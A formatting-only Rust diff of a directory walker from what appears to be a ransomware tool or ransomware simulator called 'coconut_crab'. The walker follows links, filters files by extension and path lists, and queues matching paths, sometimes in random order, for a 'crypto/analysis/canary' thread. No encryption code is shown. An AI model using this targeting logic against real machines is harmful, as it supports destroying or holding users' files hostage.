@@ -1,11 +1,11 @@
-use std::{ path::PathBuf, sync::Arc, thread, fs, os::windows::prelude::* };
-use walkdir::{ WalkDir, DirEntry };
 use crossbeam_channel::Sender;
-use rand::{ SeedableRng, rngs::SmallRng, seq::SliceRandom };
-use log::{ debug, error };
+use log::{debug, error};
+use rand::{rngs::SmallRng, seq::SliceRandom, SeedableRng};
+use std::{fs, os::windows::prelude::*, path::PathBuf, sync::Arc, thread};
+use walkdir::{DirEntry, WalkDir};
 
-use coconut_crab_lib::file::get_lowercase_extension;
 use crate::status::STATUS_FILENAME;
+use coconut_crab_lib::file::get_lowercase_extension;
 
 pub fn walk(
     sender: Sender<Arc<PathBuf>>,
@@ -13,7 +13,7 @@ pub fn walk(
     blocklist_paths_arc: Arc<Option<Vec<PathBuf>>>,
     allowlist_extensions_arc: Arc<Option<Vec<String>>>,
     blocklist_extensions_arc: Arc<Option<Vec<String>>>,
-    avoid_hidden_arc: Arc<bool>
+    avoid_hidden_arc: Arc<bool>,
 ) -> thread::JoinHandle<()> {
     debug!("Starting walk thread");
     thread::spawn(move || {
@@ -21,9 +21,14 @@ pub fn walk(
             for entry_result in WalkDir::new(starting_path)
                 .follow_links(true)
                 .into_iter()
-                .filter_entry(|entry|
-                    walk_filter(entry, blocklist_paths_arc.as_ref(), avoid_hidden_arc.as_ref())
-                ) {
+                .filter_entry(|entry| {
+                    walk_filter(
+                        entry,
+                        blocklist_paths_arc.as_ref(),
+                        avoid_hidden_arc.as_ref(),
+                    )
+                })
+            {
                 let entry = match entry_result {
                     Ok(entry_result) => {
                         debug!("Walking entry: {:?}", entry_result.path());
@@ -37,13 +42,11 @@ pub fn walk(
 
                 if entry.path().is_file() {
                     debug!("Entry is a file: {:?}", entry.path());
-                    if
-                        file_filter(
-                            &entry,
-                            allowlist_extensions_arc.as_ref(),
-                            blocklist_extensions_arc.as_ref()
-                        )
-                    {
+                    if file_filter(
+                        &entry,
+                        allowlist_extensions_arc.as_ref(),
+                        blocklist_extensions_arc.as_ref(),
+                    ) {
                         debug!("Entry matched filter: {:?}", entry.path());
                         match sender.send(Arc::new(entry.path().to_path_buf())) {
                             Ok(_) => {
@@ -53,7 +56,10 @@ pub fn walk(
                                 );
                             }
                             Err(send_result) => {
-                                error!("Failed to send path to crypto/analysis/canary thread: {}", send_result);
+                                error!(
+                                    "Failed to send path to crypto/analysis/canary thread: {}",
+                                    send_result
+                                );
                             }
                         }
                     } else {
@@ -73,7 +79,7 @@ pub fn random_walk(
     blocklist_paths_arc: Arc<Option<Vec<PathBuf>>>,
     allowlist_extensions_arc: Arc<Option<Vec<String>>>,
     blocklist_extensions_arc: Arc<Option<Vec<String>>>,
-    avoid_hidden_arc: Arc<bool>
+    avoid_hidden_arc: Arc<bool>,
 ) -> thread::JoinHandle<()> {
     debug!("Starting random walk thread");
     thread::spawn(move || {
@@ -83,9 +89,10 @@ pub fn random_walk(
             for entry_result in WalkDir::new(starting_path)
                 .follow_links(true)
                 .into_iter()
-                .filter_entry(|e|
+                .filter_entry(|e| {
                     walk_filter(e, blocklist_paths_arc.as_ref(), avoid_hidden_arc.as_ref())
-                ) {
+                })
+            {
                 let entry = match entry_result {
                     Ok(entry_result) => {
                         debug!("Walking entry: {:?}", entry_result.path());
@@ -99,13 +106,11 @@ pub fn random_walk(
 
                 if entry.path().is_file() {
                     debug!("Entry is a file: {:?}", entry.path());
-                    if
-                        file_filter(
-                            &entry,
-                            allowlist_extensions_arc.as_ref(),
-                            blocklist_extensions_arc.as_ref()
-                        )
-                    {
+                    if file_filter(
+                        &entry,
+                        allowlist_extensions_arc.as_ref(),
+                        blocklist_extensions_arc.as_ref(),
+                    ) {
                         debug!("Entry matched filter: {:?}", entry.path());
                         found_paths.push(entry.path().to_path_buf());
                     } else {
@@ -129,7 +134,10 @@ pub fn random_walk(
                     debug!("Successfully sent path to crypto/analysis/canary thread");
                 }
                 Err(send_result) => {
-                    error!("Failed to send path to crypto/analysis/canary thread: {}", send_result);
+                    error!(
+                        "Failed to send path to crypto/analysis/canary thread: {}",
+                        send_result
+                    );
                 }
             }
         }
@@ -139,7 +147,7 @@ pub fn random_walk(
 fn walk_filter(
     entry: &DirEntry,
     blocklist_paths_arc: &Option<Vec<PathBuf>>,
-    avoid_hidden_arc: &bool
+    avoid_hidden_arc: &bool,
 ) -> bool {
     let mut entry_match = true;
 
@@ -166,7 +174,7 @@ fn walk_filter(
 fn file_filter(
     entry: &DirEntry,
     allowlist_extensions_arc: &Option<Vec<String>>,
-    blocklist_extensions_arc: &Option<Vec<String>>
+    blocklist_extensions_arc: &Option<Vec<String>>,
 ) -> bool {
     let mut file_match = true;
 
@@ -189,7 +197,10 @@ fn file_filter(
             debug!("Blocklist contains file extension: {:?}", entry.path());
             file_match = false;
         } else {
-            debug!("Blocklist does not contain file extension: {:?}", entry.path());
+            debug!(
+                "Blocklist does not contain file extension: {:?}",
+                entry.path()
+            );
         }
     } else {
         debug!("Not applying blocklist to file: {:?}", entry.path());
